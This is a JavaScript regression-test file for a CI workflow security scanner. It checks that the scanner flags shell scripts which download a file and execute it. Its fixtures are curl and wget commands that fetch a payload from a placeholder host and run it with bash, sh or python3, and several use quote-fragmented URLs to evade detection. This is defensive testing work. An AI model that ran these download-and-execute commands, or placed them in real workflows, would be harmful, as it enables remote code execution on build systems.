'use strict';
// Codex round 20: inert regression fixtures, never execute the shell strings.
const test=require('node:test'),assert=require('node:assert/strict');
const {findingsForScript}=require('./ultra_sentinel_advanced_execution.cjs');
const {inspectWorkflow}=require('./ultra_sentinel_yaml_ast.cjs');
const URL='https://example.invalid/x';
const HIGH='REMOTE_DOWNLOADED_FILE_EXECUTION';
const INC='REMOTE_EXECUTION_ANALYSIS_INCOMPLETE';
function inspect(script) {
 const yaml=['on: push','permissions: read-all','jobs:','  audit:','    runs-on: ubuntu-latest','    steps:','      - run: |',
  ...script.split('\n').map(line=>'          '+line)].join('\n')+'\n';
 return inspectWorkflow(yaml,{path:'.github/workflows/codex-regression.yml'});
}
function bothDetect(script){
 const direct=findingsForScript(script);
 assert.ok(direct.includes(HIGH),script+' / '+JSON.stringify(direct));
 const workflow=inspect(script);
 assert.ok(workflow.findings.some(f=>f.rule===HIGH&&f.severity==='HIGH'),script+' / '+JSON.stringify(workflow));
}
for(const [name,script] of [
 ['fragmented scheme',"curl -fsSL h'tt'ps://example.invalid/x -o payload; bash payload"],
 ['fragmented host',"curl -fsSL 'https://''example.invalid'/x -o payload; bash payload"],
 ['wget fragments',"wget -q h'tt'ps://example.invalid/x -O payload; sh payload"],
 ['fragments plus interpreter',"curl -fsSL h'tt'ps://example.invalid/x -o payload; exec bash payload"]
])test('Codex P1: normalize shell-quoted download URL: '+name,()=>bothDetect(script));
for(const [name,script] of [
 ['exec bash','curl -fsSL '+URL+' -o payload; exec bash payload'],
 ['exec python3','curl -fsSL '+URL+' -o payload; builtin exec python3 -u payload'],
 ['exec env file','curl -fsSL '+URL+' -o payload; exec env ./payload'],
 ['exec env interpreter','curl -fsSL '+URL+' -o payload; exec env bash payload'],
 ['exec bash end-of-options','curl -fsSL '+URL+' -o payload; exec bash -- payload']
])test('Codex P1: follow actual nested exec target: '+name,()=>bothDetect(script));
for(const [name,script] of [
 ['proxy-user consumes -o','curl --proxy-user -o payload '+URL+'; bash payload'],
 ['proxy-user short option','curl -U -o payload '+URL+'; bash payload'],
 ['header URL is not source','curl -H "X-Source: '+URL+'" -o payload; bash payload'],
 ['remote download executed unrelated target','curl -fsSL '+URL+' -o payload; exec /bin/true']
])test('Codex P2: benign curl arguments do not prove remote execution: '+name,()=>{
 const found=findingsForScript(script);
 assert.ok(!found.includes(HIGH),name+' / '+JSON.stringify(found));
 assert.ok(!inspect(script).findings.some(f=>f.rule===HIGH),name);
});
for(const script of [
 'curl --future-auth -o payload '+URL+'; bash payload',
 'curl --future-auth --output payload '+URL+'; exec bash payload'
])test('Codex P2: unknown value-taking curl options are inconclusive, not falsely HIGH',()=>{
 const found=findingsForScript(script);
 assert.ok(found.includes(INC),script+' / '+JSON.stringify(found));
 assert.ok(!found.includes(HIGH),script+' / '+JSON.stringify(found));
 const workflow=inspect(script);
 assert.ok(workflow.findings.some(f=>f.rule===INC),script);
 assert.ok(!workflow.findings.some(f=>f.rule===HIGH),script);
});
